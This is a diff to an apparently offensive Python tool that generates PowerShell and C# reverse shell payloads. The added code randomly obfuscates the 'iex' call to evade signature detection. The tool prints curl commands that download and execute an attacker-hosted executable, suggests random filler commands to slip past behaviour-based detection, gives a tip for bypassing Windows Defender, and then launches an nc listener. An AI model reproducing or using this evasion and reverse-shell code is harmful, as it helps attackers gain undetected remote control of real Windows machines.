@@ -42,8 +42,16 @@ def create_pshell():
 	script = pattern.sub(replace_var, script)
 
 	# Replace iex with i''ex
-	pattern = re.compile(r'iex')
-	script = pattern.sub("i''ex", script)
+	iex_match = re.compile(r'iex')
+	def replace_invoke(match):
+		iex_rand = ["i`e`x", "i`e''x", "i''e`x", "i''e''x", "i''e'\"\"'x"]
+		iex_rep = random.choice(iex_rand)
+		chars = ['i', 'e', 'x']
+		random_char = random.choice(chars)
+		iex_rep = iex_rep.replace(random_char, random_char.upper(), 1)
+		return iex_rep
+
+	script = iex_match.sub(replace_invoke, script)
 
 	# Replace IP and port in script
 	script = script.replace("'*LHOST*',*LPORT*", f"'{ip}',{port}")
@@ -106,7 +114,7 @@ def cs_update(script, ip, port):
                 Thread.Sleep({10});
             	{5}.Start();
             	{5}.StandardInput.WriteLine({4});
-            	{5}.StandardInput.WriteLine("exit;exit;RaNdomJunkYJUNK{3}{1}{2}");
+            	{5}.StandardInput.WriteLine("exit;exit;;;{1}{9}{2}{10}{3}{1}{2}");
             	{5}.Close();
         	}}
         	catch (Exception)
@@ -160,6 +168,7 @@ def run_netcat(ip, source_file, port):
 	print(f"\n[-----+++++-----]\n\nWindows Commands To Transfer File:\n\n{Colors.OKGREEN}[*] curl http://{ip}/{source_file}.exe -o myapp.exe {Colors.ENDC}\n\nTransfer and Execute (Behaviour Detections Will Likely Flag This As Malicious)")
 	time.sleep(1)
 	print(f"\n{Colors.OKGREEN}[*] curl http://{ip}/{source_file}.exe -O && {source_file}.exe{Colors.ENDC}\n\nTransfer and Execute w/ Random Commands (Can Sometimes Bypass Behaviour Based Detection)\n\n{Colors.OKGREEN}[*] curl http://{ip}/{source_file}.exe -o myapp.exe && ping -n 5 127.0.0.1 > nul && dir > nul && myapp.exe{Colors.ENDC}\n\n[-----+++++-----]")
+	print("\nIf Defender is blocking this - change line 117 in the code \"{5}.StandardInput.WriteLine(\"exit;{1}{9}{2}{10}{3}{1}{2}\")")
 	print(f"\n\n{Colors.OKYELLOW}Running nc -lvnp {port}{Colors.ENDC}")
 	netcat_command = f"nc -lvnp {port}"
 	subprocess.run(netcat_command, shell=True)
